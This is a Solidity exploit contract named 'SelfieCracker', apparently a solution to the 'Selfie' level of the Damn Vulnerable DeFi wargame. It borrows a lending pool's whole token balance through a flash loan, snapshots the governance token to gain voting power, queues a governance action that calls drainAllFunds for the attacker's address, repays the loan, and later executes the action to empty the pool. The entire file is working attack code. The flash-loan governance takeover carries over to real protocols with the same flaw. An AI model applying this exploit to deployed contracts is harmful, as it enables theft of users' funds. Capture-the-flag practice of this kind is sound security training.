// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ISelfiePool{
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot{
    function snapshot() external returns (uint256);
}

contract SelfieCracker{

    IERC20 public immutable token;
    IDamnValuableTokenSnapshot public immutable govToken;
    ISimpleGovernance public immutable governance;
    ISelfiePool public immutable pool;
    address public attacker;
    uint256 internal targetActionId;

    constructor(address _token, address _governance, address _pool) {
        token = IERC20(_token);
        govToken = IDamnValuableTokenSnapshot(_token);
        governance = ISimpleGovernance(_governance);
        pool = ISelfiePool(_pool);
        attacker = msg.sender;
    }

    function rektPart1() public {
        _requestFlashLoan();
        // here the receiveTokens will be executed as an external call coming from the pool.
    }

    // We need a 2 day cooldown.
    function rektPart2() public {
        // Make it drain!
        governance.executeAction(targetActionId);
    }

    function _requestFlashLoan() internal {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(address, uint256 amount) external {
        bytes memory payloadPool = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        govToken.snapshot();
        targetActionId = governance.queueAction(address(pool), payloadPool, 0);
        
        // We need to return the funds to the pool before draining it.
        token.transfer(address(pool), amount);
    }


}